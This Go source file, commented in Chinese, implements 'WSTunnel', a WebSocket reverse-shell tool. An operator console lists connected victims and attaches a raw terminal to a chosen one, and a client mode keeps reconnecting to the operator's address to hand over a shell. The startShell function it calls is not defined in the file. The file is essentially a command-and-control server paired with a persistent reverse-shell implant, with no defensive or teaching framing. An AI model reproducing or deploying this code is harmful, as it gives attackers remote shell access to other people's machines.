package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"golang.org/x/term"
)

const (
	// Time allowed to write a message to the peer.
	writeWait = 10 * time.Second

	// Time allowed to read the next pong message from the peer.
	pongWait = 60 * time.Second

	// Send pings to peer with this period. Must be less than pongWait.
	pingPeriod = (pongWait * 9) / 10
)

// ==========================================
// 1. WebSocket 流适配器 (让 WS 像文件一样读写)
// ==========================================

type WSStream struct {
	Conn     *websocket.Conn
	readBuf  []byte
	mu       sync.Mutex // 读写锁，防止并发写入导致 Panic
	ReadChan chan []byte
}

func (w *WSStream) Write(p []byte) (n int, err error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.Conn.SetWriteDeadline(time.Now().Add(writeWait))
	err = w.Conn.WriteMessage(websocket.BinaryMessage, p)
	if err != nil {
		return 0, err
	}
	return len(p), nil
}

func (w *WSStream) Ping() error {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.Conn.SetWriteDeadline(time.Now().Add(writeWait))
	return w.Conn.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait))
}

func (w *WSStream) Read(p []byte) (n int, err error) {
	// 如果缓存有数据，先读缓存
	if len(w.readBuf) > 0 {
		n = copy(p, w.readBuf)
		w.readBuf = w.readBuf[n:]
		return n, nil
	}

	var message []byte

	if w.ReadChan != nil {
		// Server 模式：从 Channel 读取
		var ok bool
		message, ok = <-w.ReadChan
		if !ok {
			return 0, io.EOF
		}
	} else {
		// Client 模式：直接从 Conn 读取
		// 注意：Client 模式下 ReadMessage 会处理 Ping/Pong
		// 但我们需要确保 ReadDeadline 被刷新（如果设置了的话）
		// 这里假设 Client 端主要靠发送 Ping 维持，Server 端靠 ReadDeadline 维持
		var msgType int
		msgType, message, err = w.Conn.ReadMessage()
		if err != nil {
			return 0, err
		}
		if msgType != websocket.BinaryMessage && msgType != websocket.TextMessage {
			return 0, nil
		}
	}

	n = copy(p, message)
	if n < len(message) {
		w.readBuf = message[n:]
	}
	return n, nil
}

// ==========================================
// 2. 全局会话管理器 (Server 端核心)
// ==========================================

type Client struct {
	Conn     *websocket.Conn
	ReadChan chan []byte
}

type SessionManager struct {
	Clients map[string]*Client // ID -> Client
	Lock    sync.RWMutex
	Active  string // 当前正在控制的 Client ID，为空则表示在菜单层
}

var manager = SessionManager{
	Clients: make(map[string]*Client),
}

// ==========================================
// 3. 服务端逻辑 (Server Mode)
// ==========================================

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func startServer(addr string) {
	// 设置 Gin 为发布模式
	gin.SetMode(gin.ReleaseMode)
	r := gin.New() // 使用 New 而不是 Default，避免 Gin 默认日志干扰控制台
	r.Use(gin.Recovery())

	// WebSocket 路由
	r.GET("/ws", func(c *gin.Context) {
		conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
		if err != nil {
			return
		}

		// 生成唯一 ID (使用远程地址)
		clientID := c.Request.RemoteAddr
		
		// 注册到管理器
		readChan := make(chan []byte, 10)
		client := &Client{Conn: conn, ReadChan: readChan}

		manager.Lock.Lock()
		manager.Clients[clientID] = client
		manager.Lock.Unlock()

		// 通知管理员（如果在菜单界面）
		if manager.Active == "" {
			fmt.Printf("\n[+] New Client Connected: %s\n> ", clientID)
		}

		// 设置心跳检测
		conn.SetReadLimit(512)
		conn.SetReadDeadline(time.Now().Add(pongWait))
		conn.SetPingHandler(func(string) error {
			conn.SetReadDeadline(time.Now().Add(pongWait))
			return conn.WriteControl(websocket.PongMessage, []byte{}, time.Now().Add(writeWait))
		})

		// 保持连接存活，直到连接断开
		for {
			msgType, message, err := conn.ReadMessage()
			if err != nil {
				break
			}

			if msgType == websocket.BinaryMessage || msgType == websocket.TextMessage {
				// 只有当该 Client 被激活时，才转发数据
				if manager.Active == clientID {
					select {
					case readChan <- message:
					case <-time.After(100 * time.Millisecond):
						// 缓冲区满或超时，丢弃数据
					}
				}
			}
		}

		// 清理连接
		close(readChan)
		manager.Lock.Lock()
		delete(manager.Clients, clientID)
		manager.Lock.Unlock()
		if manager.Active == "" {
			fmt.Printf("\n[-] Client Disconnected: %s\n> ", clientID)
		}
	})

	// 启动 Web 服务 (在新的 Goroutine 中)
	go func() {
		if err := r.Run(addr); err != nil {
			log.Fatal("Server start failed:", err)
		}
	}()

	fmt.Printf("[*] WSTunnel Server Listening on %s\n", addr)
	fmt.Println("[*] Waiting for clients...")
	
	// 启动管理员控制台
	startConsole()
}

// 管理员交互控制台
func startConsole() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("wstunnel> ")
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		args := strings.Fields(input)
		if len(args) == 0 {
			continue
		}

		command := args[0]

		switch command {
		case "list":
			manager.Lock.RLock()
			fmt.Println("--- Connected Clients ---")
			i := 0
			for id := range manager.Clients {
				fmt.Printf("[%d] %s\n", i, id)
				i++
			}
			if len(manager.Clients) == 0 {
				fmt.Println("No clients connected.")
			}
			manager.Lock.RUnlock()

		case "use":
			if len(args) < 2 {
				fmt.Println("Usage: use <Client_IP>")
				continue
			}
			targetID := args[1]
			
			manager.Lock.RLock()
			client, exists := manager.Clients[targetID]
			manager.Lock.RUnlock()

			if !exists {
				fmt.Println("Error: Client not found.")
				continue
			}

			// 进入交互模式
			enterSession(targetID, client)

		case "help":
			fmt.Println("Commands: list, use <ID>, help, exit")
		
		case "exit":
			os.Exit(0)
		}
	}
}

// 进入某个 Session 的交互模式
func enterSession(id string, client *Client) {
	fmt.Printf("[*] Entering interactive shell with %s\n", id)
	fmt.Println("[*] Press 'exit' to terminate shell (this will disconnect the client)")

	manager.Active = id
	defer func() { manager.Active = "" }()

	// 开启 Raw 模式
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Printf("Failed to set raw mode: %v", err)
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	stream := &WSStream{Conn: client.Conn, ReadChan: client.ReadChan}

	// 管道对接：本地 Stdin -> 远程
	go io.Copy(stream, os.Stdin)

	// 管道对接：远程 -> 本地 Stdout
	// 这行代码会阻塞，直到连接断开
	io.Copy(os.Stdout, stream)

	// 恢复终端模式后再打印退出信息，避免格式混乱
	term.Restore(int(os.Stdin.Fd()), oldState)
	fmt.Println("\n[*] Session closed.")
}

// ==========================================
// 4. 客户端逻辑 (Client Mode)
// ==========================================

func startClient(addr string) {
	url := fmt.Sprintf("ws://%s/ws", addr)

	for {
		// 1. 发起连接
		conn, _, err := websocket.DefaultDialer.Dial(url, nil)
		if err != nil {
			time.Sleep(5 * time.Second) // 重试等待
			continue
		}

		// 2. 准备 Shell
		stream := &WSStream{Conn: conn}

		// 启动心跳包发送
		done := make(chan struct{})
		go func() {
			ticker := time.NewTicker(pingPeriod)
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					if err := stream.Ping(); err != nil {
						return
					}
				case <-done:
					return
				}
			}
		}()

		// 3. 执行 Shell (阻塞直到退出)
		startShell(stream)

		// 4. Shell 退出或断开后，关闭连接并准备重连
		close(done)
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

// ==========================================
// 5. 主程序入口
// ==========================================

func main() {
	isServer := flag.Bool("s", false, "Run as Server")
	isClient := flag.Bool("c", false, "Run as Client")
	addr := flag.String("addr", "localhost:8080", "Address to listen (server) or connect (client)")
	
	flag.Parse()

	if *isServer {
		startServer(*addr)
	} else if *isClient {
		startClient(*addr)
	} else {
		fmt.Println("Usage:")
		fmt.Println("  Server: wstunnel -s -addr :8080")
		fmt.Println("  Client: wstunnel -c -addr <ServerIP>:8080")
	}
}
